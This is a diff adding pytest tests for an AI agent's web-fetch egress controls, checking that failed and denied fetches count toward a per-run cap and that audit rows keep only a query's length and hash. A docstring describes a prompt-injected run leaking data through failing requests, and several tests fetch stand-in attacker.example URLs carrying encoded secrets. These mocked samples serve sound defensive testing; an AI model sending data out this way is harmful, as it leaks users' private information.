@@ -476,3 +476,202 @@ async def test_a_denied_fetch_is_a_tool_error_not_a_dead_run(ctx, research, monk
     result, is_error = await execute_tool(ctx, spec, {"url": "https://blocked.example.com/"})
     assert is_error is True
     assert "blocked.example.com is not on this deployment's research allowlist" in result
+
+
+# ── failed attempts count, and the query reaches the audit row as a fingerprint ──
+def _fetch_cap(monkeypatch, n: int) -> None:
+    from tret.config import get_settings
+
+    monkeypatch.setenv("TRET_EGRESS_RESEARCH_MAX_FETCHES_PER_RUN", str(n))
+    get_settings.cache_clear()
+
+
+async def test_failed_fetches_exhaust_the_per_run_cap(ctx, research, monkeypatch):
+    """A run whose every request 404s must still hit the cap.
+
+    Counting only successes let a prompt-injected run make unlimited failing
+    requests, each carrying data in its URL (`attacker.example/?d=...`).
+    """
+    from tret.net.fetch import FetchError
+
+    research(MODE_ON)
+    _fetch_cap(monkeypatch, 3)
+    attempts: list[str] = []
+
+    async def always_404(url):
+        attempts.append(url)
+        raise FetchError(f"HTTP 404 from {url}", status_code=404)
+
+    monkeypatch.setattr(tools_module, "fetch_page", always_404)
+    for i in range(3):
+        with pytest.raises(ToolError) as failed:
+            await fetch_url(ctx, url=f"https://attacker.example/?d=chunk{i}")
+        assert "Could not read" in str(failed.value)
+    with pytest.raises(ToolError) as capped:
+        await fetch_url(ctx, url="https://attacker.example/?d=chunk3")
+    assert "per-run limit" in str(capped.value)
+    assert len(attempts) == 3  # the fourth never left the process
+    assert ctx.web_fetches == 3
+
+
+async def test_denied_fetches_exhaust_the_per_run_cap_too(ctx, research, monkeypatch):
+    from tret.net.policy import EgressDenied
+
+    research(MODE_ON)
+    _fetch_cap(monkeypatch, 2)
+    attempts: list[str] = []
+
+    async def refuse(url):
+        attempts.append(url)
+        raise EgressDenied("private_address", url, CLASS_RESEARCH, "resolves to 127.0.0.1")
+
+    monkeypatch.setattr(tools_module, "fetch_page", refuse)
+    for _ in range(2):
+        with pytest.raises(ToolError):
+            await fetch_url(ctx, url="https://sneaky.example/")
+    with pytest.raises(ToolError) as capped:
+        await fetch_url(ctx, url="https://sneaky.example/")
+    assert "per-run limit" in str(capped.value)
+    assert len(attempts) == 2
+
+
+def _fingerprint(query: str) -> tuple[int, str]:
+    import hashlib
+
+    return len(query), hashlib.sha256(query.encode()).hexdigest()[:16]
+
+
+async def test_the_audit_row_carries_the_query_length_and_hash_not_the_query(
+    ctx, research, fetches
+):
+    research(MODE_ON)
+    query = "d=SECRET-PAYLOAD&k=1"
+    fetches(url=f"https://example.com/filing?{query}")
+    await fetch_url(ctx, url=f"https://example.com/filing?{query}")
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    assert (call.query_length, call.query_sha256) == _fingerprint(query)
+    assert call.path == "/filing"
+    for column in (call.host, call.path, call.reason or ""):
+        assert "SECRET-PAYLOAD" not in column
+
+
+async def test_a_failed_fetch_audit_row_carries_the_query_fingerprint(ctx, research, monkeypatch):
+    from tret.net.fetch import FetchError
+
+    research(MODE_ON)
+    query = "d=ZXhmaWx0cmF0ZWQ"
+
+    async def not_found(url):
+        raise FetchError("HTTP 404", status_code=404)
+
+    monkeypatch.setattr(tools_module, "fetch_page", not_found)
+    with pytest.raises(ToolError):
+        await fetch_url(ctx, url=f"https://attacker.example/x?{query}")
+    await ctx.db.rollback()  # the engine rolls a failed tool call back; the audit row must survive
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    assert call.decision == "denied" and call.host == "attacker.example"
+    assert (call.query_length, call.query_sha256) == _fingerprint(query)
+    assert query not in (call.path + (call.reason or ""))
+
+
+async def test_a_url_without_a_query_records_length_zero_and_no_hash(ctx, research, fetches):
+    research(MODE_ON)
+    fetches()
+    await fetch_url(ctx, url="https://example.com/filing")
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    assert (call.query_length, call.query_sha256) == (0, None)
+
+
+async def test_a_search_audit_row_carries_the_query_fingerprint(ctx, research, monkeypatch):
+    research(MODE_ON)
+    _search_cap(monkeypatch, 5)
+    query = "private question about Acme Corp"
+    await web_search(ctx, query=query)
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    assert call.path == "/search"
+    assert (call.query_length, call.query_sha256) == _fingerprint(query)
+    assert query not in (call.reason or "")
+
+
+async def test_a_failed_fetch_never_leaves_the_query_text_in_any_column(ctx, research, monkeypatch):
+    """The real fetcher's own error text quotes the URL: it must arrive stripped."""
+    import httpx
+
+    from tret.net import fetch as fetch_pkg
+    from tret.net.fetch import fetch as fetch_module
+
+    research(MODE_ON)
+    secret = "ZXhmaWx0cmF0ZWQtc2VjcmV0"
+    url = f"https://attacker.example/x?d={secret}#frag{secret}"
+
+    class _Resp:
+        status_code = 404
+        is_redirect = False
+        headers = httpx.Headers()
+
+        async def __aenter__(self):
+            return self
+
+        async def __aexit__(self, *a):
+            return False
+
+    class _Client:
+        def stream(self, method, target):
+            return _Resp()
+
+    class _Open:
+        async def __aenter__(self):
+            return _Client()
+
+        async def __aexit__(self, *a):
+            return False
+
+    async def passthrough(*a, **k):
+        return None
+
+    monkeypatch.setattr(fetch_module, "open_client", lambda *a, **k: _Open())
+    monkeypatch.setattr(fetch_module, "check_url", passthrough)
+    monkeypatch.setattr(tools_module, "fetch_page", fetch_pkg.fetch_page)
+    with pytest.raises(ToolError):
+        await fetch_url(ctx, url=url)
+    await ctx.db.rollback()
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    for column in EgressCall.__table__.columns.keys():
+        assert secret not in str(getattr(call, column))
+    assert "404" in call.reason and call.query_length == len(f"d={secret}")
+
+
+async def test_record_time_backstop_strips_urls_from_reason(ctx):
+    from tret.net import audit
+
+    row = await audit.record(
+        ctx.db, egress_class="research", method="GET", host="h", path="/",
+        decision="denied",
+        reason="Client error '404' for url 'https://h.example/s?q=private+term#x' (see https://a.example/?k=1)",
+    )
+    assert "private" not in row.reason and "k=1" not in row.reason
+    assert "https://h.example/s" in row.reason
+
+
+async def test_a_redirect_does_not_hide_the_query_fingerprint(ctx, research, monkeypatch):
+    research(MODE_ON)
+    import hashlib
+
+    query = "d=" + "A" * 4000
+    start = f"https://attacker.example/?{query}"
+    body = PAGE_HTML
+    page = FetchedPage(
+        url="https://attacker.example/", requested_url=start, status_code=200,
+        content_type="text/html", extension=".html", body=body,
+        sha256=hashlib.sha256(body).hexdigest(), duration_ms=1,
+        redirects=(start,), truncated=False,
+    )
+
+    async def fake_fetch(target):
+        return page
+
+    monkeypatch.setattr(tools_module, "fetch_page", fake_fetch)
+    await fetch_url(ctx, url=start)
+    call = (await ctx.db.execute(select(EgressCall))).scalars().one()
+    assert call.query_length == len(query)
+    assert call.query_sha256 == hashlib.sha256(query.encode()).hexdigest()[:16]
